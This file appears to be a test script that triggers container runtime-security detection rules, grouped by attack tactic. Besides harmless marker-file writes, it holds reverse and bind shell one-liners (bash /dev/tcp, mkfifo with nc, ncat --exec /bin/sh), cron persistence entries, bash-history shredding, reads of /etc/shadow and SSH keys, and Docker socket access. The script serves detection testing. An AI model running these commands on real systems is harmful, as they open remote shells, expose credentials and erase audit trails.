#Execution
#1.rule: DB program spawned process 
#need web env

#2.rule: Run shell untrusted
#not proc.name in (shell_binaries)
#bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/21540 <&1'
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 21540 >/tmp/f


#3.rule: Terminal shell in container
#not proc.name in (shell_binaries)
#bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/21541 <&1'

#4.rule: Netcat Remote Code Execution in Container
ncat --sh-exec /bin/sh -lvp 21542 &
ncat --exec /bin/sh -lvp 21542 &
nc -e /bin/sh -lvp 21542 &
nc -s /bin/sh -lvp 21542 &

#Persistence
#1.rule: Modify Shell Configuration File 
#not proc.name in (shell_binaries)
#mv /root/.bash_history /root/.bash_history_old
#echo thisistest >> /root/.bash_history
#mv /root/.bash_history_old /root/.bash_history


#2.rule: Schedule Cron Jobs
echo  "* * * * * whoami > /root/test" >> /var/spool/cron/crontabs/root
echo  "* * * * * whoami > /root/test" >> /var/spool/cron/root
echo  "* * * * * whoami > /root/test" >> /etc/cron/root

#3.rule: Update Package Repository
mv /etc/apt/sources.list.d/sources.list /etc/apt/sources.list.d/sources.list_old
echo thisistest >> /etc/apt/sources.list.d/sources.list
mv /etc/apt/sources.list.d/sources.list_old /etc/apt/sources.list.d/sources.list
mv /etc/yum.repos.d/sources.list /etc/yum.repos.d/sources.list_old
echo thisistest >> /etc/yum.repos.d/sources.list
mv /etc/yum.repos.d/sources.list_old /etc/yum.repos.d/sources.list

#4.rule: Write below binary dir
echo thisistest > /bin/thisistest
rm /bin/thisistest

#5.rule: Write below monitored dir
mkdir boot
echo thisistest > /boot/thisistest
rm /boot/thisistest

#6.rule: Write below etc
echo thisistest > /etc/thisistest
rm /etc/thisistest

#7:rule: Write below root
#default close
echo thisistest > /root/thisistest
rm /root/thisistest

#8:rule: Write below rpm database
mkdir /var/lib/rpm/
echo thisistest > /var/lib/rpm/thisistest
rm /var/lib/rpm/thisistest

#9.rule: Modify binary dirs
echo thisistest > /bin/thisistest
mv /bin/thisistest /bin/thisistest0
rm /bin/thisistest0

#10.rule: Mkdir binary dirs
mkdir /bin/thistest

#11.rule: User mgmt binaries 
#not container
#useradd test
#userdel test


#12.rule: Create files below dev
echo thisistest > /dev/thisistest
rm /dev/thisistest

#13.rule: Launch Package Management Process in Container
apt list 
yum list

#14.rule: Remove Bulk Data from Disk
echo thisistest > /tmp/thisistest
shred /tmp/thisistest

#15.rule: Create Hidden Files or Directories
#consider_hidden_file_creation:never true
mkdir /root/.thisistest
touch /root/.thisistest/.thisistest

#16.rule: Set Setuid or Setgid bit
touch /tmp/thisistest
chmod +s /tmp/thisistest
rm /tmp/thisistest

#Privilege Escalation
#1.rule: Launch Privileged Container
#done

#2.rule: Non sudo setuid
# not user.name=root 
touch /tmp/thisistest
chmod +s /tmp/thisistest
rm /tmp/thisistest

#Defense Evasion 
#1.rule: Clear Log Activities
mkdir /tmp/thisistest/
echo > /tmp/thisistest/syslog 

#2.rule: Delete Bash History
echo test >> /root/.bash_history 
shred /root/.bash_history 
rm /root/.bash_history 

#Credential Access
#1.rule: Read sensitive file trusted after startup
#need env

#2.Search Private Keys or Passwords
cat authorized_keys |grep 'BEGIN PRIVATE'

#Discovery
#1.rule: Read Shell Configuration File
#never true
cat /root/.bashrc

#2.rule: Read ssh information
#never true
cat /root/.ssh/authorized_keys

#3.rule: Read sensitive file untrusted
cat /etc/shadow

#4.rule: Contact K8S API Server From Container
#need env

#5.rule: Lauch Suspicious Network Tool in Container
dig
#tcpdump &
nc
ncat
nmap
#tshark &
#ngrep &

#6.rule: Launch Suspicious Network Tool on Host
#need host env

#Lateral Movement
#1.rule: Launch Privileged Container
#need env

#2.rule: Launch Sensitive Mount Container
#mount host
chroot /root
#docker in docker,mount docker.sock
tar -xvzf /tmp/docker-19.03.9.tgz -C /tmp/
/tmp/docker/docker -H unix:///custom/docker/docker.sock ps
/tmp/docker/docker -H unix:///custom/docker/docker.sock images

#3.rule: Launch Disallowed Container
#need env

#Exfiltration
#1.rule: System procs network activity
#need public ip
#bash -c 'exec bash -i &>/dev/tcp/public IP/port <&1'

#2.rule: Interpreted procs inbound network activity
#need public ip
#perl, python, ruby, etc. Reverse shell

#3.rule: Interpreted procs onbound network activity
#need public ip
#perl, python, ruby, etc. reverse shell

#4.rule: Unexpected UDP Traffic
#dnscat reverse shell
#need public ip and domain

#5.rule: Lauch Suspicious Network Tool in Container
dig
#tcpdump &
nc
ncat
nmap
#tshark &
#ngrep &

#6.rule: Launch Suspicious Network Tool on Host
#need host env
